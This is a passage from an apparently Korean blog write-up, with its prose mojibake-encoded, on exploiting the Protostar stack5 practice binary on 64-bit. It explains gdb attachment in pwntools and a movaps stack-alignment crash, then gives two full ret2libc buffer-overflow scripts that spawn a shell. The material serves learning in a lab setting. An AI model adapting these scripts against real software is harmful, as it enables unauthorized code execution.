&lt;p&gt;pwntoolsì—ì„œ ì œê³µí•˜ëŠ” ê¸°ëŠ¥ ì¤‘, gdbì— í˜„ì¬ í”„ë¡œì„¸ìŠ¤ë¥¼ attachí•˜ê²Œ í•´ì£¼ëŠ” ê¸°ëŠ¥ì´ ìˆë‹¤. í˜„ì¬ í”„ë¡œì„¸ìŠ¤ì˜ pidë¥¼ ê°€ì ¸ì™€ ê·¸ê²ƒì„ gdbì—ê²Œ ì£¼ëŠ” ì‹ì˜ ë§¤ì»¤ë‹ˆì¦˜ì¸ë°, ì´ë¥¼ ì‚¬ìš©í•˜ëŠ” ë°©ë²•ì€ ì•„ë˜ì™€ ê°™ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ROP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7ffff79e2000&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;gadget_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find_gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;pop rdi&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;ret&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;system_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;system&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;string_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;gadget_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget_offset&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;system_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_offset&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;string_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string_offset&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./stack5_64&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;raw_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb.attach(process({program_name}))&lt;/code&gt;ë¥¼ ì´ìš©í•´ ìŠ¤í¬ë¦½íŠ¸ì—ì„œ ëŒë¦¬ëŠ” í”„ë¡œê·¸ë¨ì— gdbë¥¼ ë¶™ì´ë„ë¡ í–ˆê³ , gdbë¥¼ ë¶™ì¸ í”„ë¡œê·¸ë¨ì´ ë¯¸ì²˜ ë°˜ì‘í•˜ê¸°ë„ ì „ì— ì‹¤í–‰ë˜ê³  ëë‚˜ë²„ë¦¬ëŠ” ìƒí™©ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;raw_input(â€1â€)&lt;/code&gt; ì½”ë“œë¥¼ ì‚½ì…í–ˆë‹¤. ìœ„ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ë©´ gdb ì°½ì´ ëœ¨ëŠ”ë°, ê·¸ë•Œ ë¸Œë ˆì´í¬ í¬ì¸íŠ¸ë¥¼ ì„¤ì •í•˜ê³  ì›ë˜ í„°ë¯¸ë„ ì°½ì— 1ì„ ì…ë ¥í•œ í›„ gdb ì°½ì—ì„œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt; ë¥¼ ëˆ„ë¥´ë©´ ë””ë²„ê¹…ì„ í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë¸Œë ˆì´í¬ í¬ì¸íŠ¸ ì„¤ì • ì‹œ ì½œìŠ¤íƒì„ ì˜ í™•ì¸í•´ì•¼ í•œë‹¤. ì´ë¯¸ ì‹¤í–‰ë˜ì—ˆë˜ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì— ë¸Œë ˆì´í¬ í¬ì¸íŠ¸ë¥¼ ì„¤ì •í•˜ëŠ” ë°”ë³´ì§“ì€ ì ˆëŒ€ ì—„ê¸ˆì´ë‹¤! &lt;em&gt;ê·¸ë ‡ë‹¤. ë‚´ê°€ ë°”ë¡œ ê·¸ ë°”ë³´ë‹¤! ì•ˆë…•í•˜ì„¸ìš” ë°˜ê°‘ìŠµë‹ˆë‹¤ ë°”ë³´ 1ì…ë‹ˆë‹¤&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; í•¨ìˆ˜ëŠ” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_system&lt;/code&gt; í•¨ìˆ˜ë¥¼ ì½œí•˜ê³ , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_system&lt;/code&gt; í•¨ìˆ˜ëŠ” ê±°ì˜ ë„íŠ¸ë¨¸ë¦¬ì—ì„œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve&lt;/code&gt; í•¨ìˆ˜ë¥¼ ì½œí•˜ë©´ì„œ ì¸ìë¥¼ ë„˜ê²¨ì£¼ëŠ” í˜•ì‹ì´ë‹¤. ì¦‰, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_system&lt;/code&gt; í•¨ìˆ˜ ë‚´ë¶€ë¡œ ë“¤ì–´ê°”ì„ ë•Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve&lt;/code&gt; ë¥¼ ì½œí•˜ê¸°ë„ ì „ì— SEGFAULTê°€ ë‚˜ëŠ” ì´ìœ ë¥¼ ì•Œì•„ë‚´ëŠ” ê²ƒì´ í˜„ì¬ ë””ë²„ê¹…ì˜ ëª©ì ì´ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2014.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt;ë¥¼ ëˆ„ë¥´ê³  ë³´ë©´ ìœ„ ë¶€ë¶„ì—ì„œ ripê°€ freezed ëœ ê²ƒì´ ë³´ì¸ë‹¤.&lt;/p&gt;

&lt;p&gt;ëŒ€ê´€ì ˆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;movaps&lt;/code&gt; ê°€ ë­ëƒ ì‹¶ë‹¤.  ê²€ìƒ‰í•´ë³¸ ê²°ê³¼, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;movaps&lt;/code&gt; ëŠ” 64 ë¹„íŠ¸ í”„ë¡œê·¸ë¨ì˜ Calling conventionì„ ì§€ì¼œì£¼ê³ ì ë„ì…ëœ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ìœ¼ë¡œ, ìŠ¤íƒ ì£¼ì†Œê°€ 16ì˜ ë°°ìˆ˜ë¡œ ë”±ë”± ë–¨ì–´ì§€ê²Œ ë°ì´í„°ê°€ ë‹´ê²¨ìˆëŠ” ê²Œ ì•„ë‹ˆë©´ ì•ìœ¼ë¡œì˜ í•¨ìˆ˜ ì½œì— ì‹¬ê°í•œ ë¬¸ì œê°€ ìƒê¸¸ ê²ƒì„ ìš°ë ¤í•´ í”„ë¡œê·¸ë¨ì„ ë©ˆì¶”ê²Œ ë§Œë“œëŠ” ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ì§€ê¸ˆ ë¬¸ì œê°€ ëœ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ë³´ë©´, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;movaps xmmword ptr [rsp + 0x40], xmm0&lt;/code&gt; ì´ë¼ê³  ë˜ì–´ ìˆëŠ”ë°, xmm0ë¼ëŠ” ë ˆì§€ìŠ¤í„°ëŠ” SIMD ì—°ì‚°ì— ì‚¬ìš©ë˜ëŠ” ì „ìš© ë ˆì§€ìŠ¤í„°ì¸ë°, SIMD(Single Instruction Multi Data)ë¼ëŠ” ì´ë¦„ì—ì„œë„ ì•Œ ìˆ˜ ìˆë“¯ í•œ ë ˆì§€ìŠ¤í„°ì— 4ê°œì˜ ë°ì´í„°ë¥¼ í•œêº¼ë²ˆì— ì§‘ì–´ë„£ì„ ìˆ˜ ìˆëŠ” ë ˆì§€ìŠ¤í„°ì´ë‹¤. ì§€ê¸ˆì€ ì¤‘ìš”í•˜ì§€ ì•Šìœ¼ë‹ˆ ê·¸ëƒ¥ ë„˜ì–´ê°€ì. ì¤‘ìš”í•œ ê²ƒì€ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xmmword ptr [rsp + 0x40]&lt;/code&gt; ì´ë‹¤. í˜„ì¬ ë³´ì´ëŠ” ì»¨í…ìŠ¤íŠ¸ì˜ ì•„ë«ë¶€ë¶„ì— í‘œí˜„ëœ ìŠ¤íƒì„ í™•ì¸í•˜ë©´, rspì˜ ìœ„ì¹˜ëŠ” ëì´ 8ë¡œ ëë‚˜ê¸° ë•Œë¬¸ì— 8ì˜ ë°°ìˆ˜ì´ì§€ë§Œ 16ì˜ ë°°ìˆ˜ëŠ” ì•„ë‹ˆë‹¤. ì—¬ê¸°ì— &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x40&lt;/code&gt; ì„ ë”í•œ ìŠ¤íƒì˜ ìœ„ì¹˜ëŠ” ì—­ì‹œ 8ì˜ ë°°ìˆ˜ì´ì§€ë§Œ 16ì˜ ë°°ìˆ˜ëŠ” ì•„ë‹ˆë‹¤. ì¦‰, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;movaps&lt;/code&gt; ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ì¢…ë£Œ ì¡°ê±´ì— ë”± ë“¤ì–´ë§ëŠ” ìƒí™©ì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ì´ëŸ° ìƒí™©ì€ ì‚¬ì‹¤ ROP ê³µê²©ì„ í•˜ì§€ ì•Šì•˜ë‹¤ë©´ ë°œìƒí•˜ì§€ ì•Šì•˜ì„ ìƒí™©ì´ë‹¤. ê·¸ë¦¬ê³  ROP ê³µê²©ì„ í•  ë•Œ ê°€ì¥ ìì£¼ ë§ë‹¥ëœ¨ë¦¬ëŠ” pitfall ì´ê¸°ë„ í•˜ë‹¤. ì¡°ê¸ˆ ë” ìì„¸í•œ ì„¤ëª…ì€ &lt;a href=&quot;https://ropemporium.com/guide.html&quot;&gt;ì´ìª½ì„ ì°¸ê³ í•˜ì.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ë§ì´ ê±°ì°½í–ˆëŠ”ë°, í•´ê²°ë²•ì€ ê°„ë‹¨í•˜ë‹¤. ë‚´ê°€ rsp ì£¼ì†Œë¥¼ ë§ˆìŒëŒ€ë¡œ ë°”ê¾¸ë‹¤ê°€ rsp ì£¼ì†Œê°€ 16ì˜ ë°°ìˆ˜ê°€ ì•„ë‹Œ 8ì˜ ë°°ìˆ˜ê°€ ë˜ë„ë¡ ë§Œë“¤ì–´ ë†¨ìœ¼ë‹ˆ, rspê°€ í•œ ì¹¸(8 bytes)ì„ ë” ë‚´ë ¤ê°€ë“  ì˜¬ë¼ê°€ë“  í•˜ë„ë¡ í•˜ë©´ ëœë‹¤. ì´ ë•Œ ë”±íˆ í˜ì´ë¡œë“œ êµ¬ì¡°ë¥¼ í¬ê²Œ ë°”ê¾¸ì§€ ì•Šê³  rspê°€ í•œ ì¹¸(8 bytes) ë” ì´ë™í•˜ë„ë¡ í•˜ëŠ” ì œì¼ ì‰¬ìš´ ë°©ë²•ì€ retë¥¼ ì²˜ìŒì— í•˜ë‚˜ ë¼ì›Œë„£ëŠ” ê²ƒì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ì¦‰ í˜ì´ë¡œë“œëŠ” ì•„ë˜ì™€ ê°™ì€ í˜•íƒœê°€ ëœë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;offset bytes + Gadget1 address(ret;) + Gadget2 address(pop rdi;ret;) + parameter address + Library function address
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ret addì— ìˆëŠ” ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ì£¼ì†Œë¡œ ripë¥¼ ì˜®ê²¨ë†“ìœ¼ë‹ˆ ë˜ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt;ì„ í•˜ë˜ì„œ rspê°€ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œì— ìˆëŠ” ì£¼ì†Œê°’ì„ ripì— ë„£ì–´ì£¼ë‹ˆ ì´ë²ˆì—” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi;ret;&lt;/code&gt;ê°€ ê¸°ë‹¤ë¦¬ê³  ìˆëŠ” í˜•ì‹ì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ìœ„ì™€ ê°™ì€ í˜ì´ë¡œë“œë¥¼ ë³´ë‚´ê¸° ìœ„í•´ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì•„ë˜ì™€ ê°™ì´ ë³€í˜•í–ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ROP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7ffff79e2000&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;extra_ret_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find_gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;ret&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;gadget_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find_gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;pop rdi&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;ret&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;system_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;system&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;string_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;extra_ret_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extra_ret_offset&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;gadget_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget_offset&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;system_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_offset&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;string_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string_offset&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./stack5_64&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extra_ret_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# gdb.attach(p)
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# raw_input(&quot;1&quot;)
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ ê²°ê³¼ ì•„ë˜ì™€ ê°™ì´ ì‰˜ì„ ë”¸ ìˆ˜ ìˆì—ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2015.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

